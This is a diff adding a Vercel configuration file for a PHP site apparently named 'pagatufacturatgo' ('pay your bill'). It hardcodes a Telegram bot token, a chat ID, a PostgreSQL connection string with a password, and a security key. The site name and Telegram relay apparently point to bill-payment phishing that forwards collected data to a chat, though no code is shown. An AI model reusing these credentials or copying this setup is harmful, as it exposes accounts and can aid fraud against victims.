@@ -1,0 +1,33 @@
+{
+  "functions": {
+    "api/router.php": {
+      "runtime": "vercel-php@0.7.1"
+    }
+  },
+  "routes": [
+    {
+      "src": "/(.*\\.css)",
+      "dest": "/$1"
+    },
+    {
+      "src": "/(.*\\.js)",
+      "dest": "/$1"
+    },
+    {
+      "src": "/(.*\\.(png|jpg|jpeg|gif|svg|ico|webp|html))",
+      "dest": "/$1"
+    },
+    {
+      "src": "/(?<path>.*)",
+      "dest": "/api/router.php?path=$path"
+    }
+  ],
+  "env": {
+    "BOT_TOKEN": "8334889903:AAFvz341HwSjL3UG3BXq8rQf3RZWj0Gc9dA",
+    "CHAT_ID": "-1003827381225",
+    "DATABASE_URL": "postgresql://neondb_owner:npg_joDXlhHQw7O4@ep-twilight-king-ada5hr56-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require",
+    "BASE_URL": "https://pagatufacturatgo.vercel.app/updatetele.php",
+    "SECURITY_KEY": "secure_key_123"
+  }
+}
+
